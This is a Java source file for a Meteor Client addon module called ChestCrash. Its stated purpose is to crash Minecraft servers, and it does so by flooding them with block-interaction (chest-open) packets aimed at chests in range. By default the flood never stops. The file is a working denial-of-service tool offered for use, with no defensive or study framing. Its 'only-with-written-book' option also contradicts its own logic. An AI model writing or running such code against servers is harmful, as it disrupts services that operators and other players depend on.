/*
 * This file is part of the Meteor Client distribution (https://github.com/MeteorDevelopment/meteor-client).
 * Copyright (c) Meteor Development.
 */

package io.jackywacky.addon.modules.crashes;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.game.OpenScreenEvent;
import meteordevelopment.meteorclient.events.render.Render3DEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.ColorSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.meteorclient.utils.player.PlayerUtils;
import meteordevelopment.meteorclient.utils.render.RenderUtils;
import meteordevelopment.meteorclient.utils.render.color.SettingColor;
import meteordevelopment.meteorclient.utils.world.Dir;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.block.Blocks;
import net.minecraft.block.ChestBlock;
import net.minecraft.block.entity.BlockEntity;
import net.minecraft.block.entity.ChestBlockEntity;
import net.minecraft.block.entity.TrappedChestBlockEntity;
import net.minecraft.client.gui.screen.DisconnectedScreen;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.inventory.Inventory;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import io.jackywacky.addon.DupersUnitedPublicAddon;

import java.util.ArrayList;
import java.util.List;

public class ChestCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    private final SettingGroup sgRender = settings.createGroup("Render");

    private final Setting<Integer> range = sgGeneral.add(new IntSetting.Builder()
        .name("range")
        .description("Range to find chests (in blocks).")
        .defaultValue(5)
        .min(1)
        .max(10)
        .sliderRange(1, 10)
        .build()
    );

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("packets")
        .description("Total number of open packets to send. 0 = indefinitely.")
        .defaultValue(0)
        .min(0)
        .max(10000)
        .sliderMax(1000)
        .build()
    );

    private final Setting<Boolean> onlyWithBook = sgGeneral.add(new BoolSetting.Builder()
        .name("only-with-written-book")
        .description("Only target chests that contain a written/writable book. Requires chest data (client may not have this until opened).")
        .defaultValue(false)
        .build()
    );

    private final Setting<Boolean> disableOnDisconnect = sgGeneral.add(new BoolSetting.Builder()
        .name("disable-on-disconnect")
        .description("Disables the module when disconnected from the server.")
        .defaultValue(true)
        .build()
    );

    private final Setting<SettingColor> chestColor = sgRender.add(new ColorSetting.Builder()
        .name("chest-color")
        .description("Color to highlight chests.")
        .defaultValue(new SettingColor(0, 255, 0, 80))
        .build()
    );

    private int totalPacketsSent = 0;

    public ChestCrash() {
        super(DupersUnitedPublicAddon.CATEGORY_CRASHES, "chest-crash", "Sends open chest packets repeatedly to crash servers. Targets chests in range.");
    }

    @Override
    public void onActivate() {
        totalPacketsSent = 0;
        if (hasChestsWithBooksInRange()) {
            toggle();
            info("Chests with written books in range - disabled to protect them.");
            return;
        }
    }

    @EventHandler
    private void onScreenOpen(OpenScreenEvent event) {
        if (disableOnDisconnect.get() && event.screen instanceof DisconnectedScreen) {
            toggle();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (disableOnDisconnect.get()) toggle();
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null || mc.world == null) return;
        if (mc.getNetworkHandler() == null) return;

        if (hasChestsWithBooksInRange()) {
            toggle();
            info("Chests with written books in range - disabled to protect them.");
            return;
        }

        List<BlockPos> chests = getChestsInRange();

        if (chests.isEmpty()) return;

        for (BlockPos pos : chests) {
            if (packets.get() > 0 && totalPacketsSent >= packets.get()) {
                toggle();
                return;
            }
            sendOpenPacket(pos);
            totalPacketsSent++;
        }
    }

    /** True if any chest in range contains written/writable books (never target these). */
    private boolean hasChestsWithBooksInRange() {
        double rangeSq = range.get() * range.get();
        for (BlockEntity blockEntity : Utils.blockEntities()) {
            if (!(blockEntity instanceof ChestBlockEntity) && !(blockEntity instanceof TrappedChestBlockEntity)) continue;
            BlockPos pos = blockEntity.getPos();
            if (PlayerUtils.squaredDistanceTo(pos) > rangeSq) continue;
            if (hasWrittenBook(blockEntity)) return true;
        }
        return false;
    }

    private List<BlockPos> getChestsInRange() {
        List<BlockPos> result = new ArrayList<>();
        double rangeSq = range.get() * range.get();

        for (BlockEntity blockEntity : Utils.blockEntities()) {
            if (!(blockEntity instanceof ChestBlockEntity) && !(blockEntity instanceof TrappedChestBlockEntity)) continue;
            BlockPos pos = blockEntity.getPos();
            if (PlayerUtils.squaredDistanceTo(pos) > rangeSq) continue;
            if (hasWrittenBook(blockEntity)) continue; // never target chests with books
            if (onlyWithBook.get()) continue; // only target chests WITH books - excluded above, so skip
            result.add(pos);
        }
        return result;
    }

    private boolean hasWrittenBook(BlockEntity blockEntity) {
        if (blockEntity instanceof Inventory inv) {
            for (int i = 0; i < inv.size(); i++) {
                ItemStack stack = inv.getStack(i);
                if (stack.isEmpty()) continue;
                if (stack.getItem() == Items.WRITTEN_BOOK) return true;
                if (stack.getItem() == Items.WRITABLE_BOOK) {
                    if (stack.get(DataComponentTypes.WRITABLE_BOOK_CONTENT) != null
                        && !stack.get(DataComponentTypes.WRITABLE_BOOK_CONTENT).pages().isEmpty()) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    private void sendOpenPacket(BlockPos pos) {
        BlockHitResult hitResult = new BlockHitResult(
            Vec3d.ofCenter(pos).add(0, 0.5, 0),
            Direction.UP,
            pos,
            false
        );
        mc.getNetworkHandler().sendPacket(
            new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, hitResult, 0)
        );
    }

    @EventHandler
    private void onRender(Render3DEvent event) {
        if (mc.player == null || mc.world == null) return;

        double rangeSq = range.get() * range.get();

        for (BlockEntity blockEntity : Utils.blockEntities()) {
            if (!(blockEntity instanceof ChestBlockEntity) && !(blockEntity instanceof TrappedChestBlockEntity)) continue;
            BlockPos pos = blockEntity.getPos();
            if (PlayerUtils.squaredDistanceTo(pos) > rangeSq) continue;
            if (hasWrittenBook(blockEntity)) continue; // don't highlight - protected
            if (onlyWithBook.get()) continue; // no targets in only-with-book mode

            renderChest(event, blockEntity);
        }
    }

    private void renderChest(Render3DEvent event, BlockEntity blockEntity) {
        BlockPos pos = blockEntity.getPos();
        double x1 = pos.getX();
        double y1 = pos.getY();
        double z1 = pos.getZ();
        double x2 = x1 + 1;
        double y2 = y1 + 1;
        double z2 = z1 + 1;

        int excludeDir = 0;
        if (blockEntity instanceof ChestBlockEntity) {
            var state = mc.world.getBlockState(pos);
            if ((state.getBlock() == Blocks.CHEST || state.getBlock() == Blocks.TRAPPED_CHEST)
                && state.get(ChestBlock.CHEST_TYPE) != net.minecraft.block.enums.ChestType.SINGLE) {
                excludeDir = Dir.get(ChestBlock.getFacing(state));
            }
        }

        double a = 1.0 / 16.0;
        if (Dir.isNot(excludeDir, Dir.WEST)) x1 += a;
        if (Dir.isNot(excludeDir, Dir.NORTH)) z1 += a;
        if (Dir.isNot(excludeDir, Dir.EAST)) x2 -= a;
        y2 -= a * 2;
        if (Dir.isNot(excludeDir, Dir.SOUTH)) z2 -= a;

        event.renderer.box(x1, y1, z1, x2, y2, z2, chestColor.get(), chestColor.get(), meteordevelopment.meteorclient.renderer.ShapeMode.Both, excludeDir);
    }
}
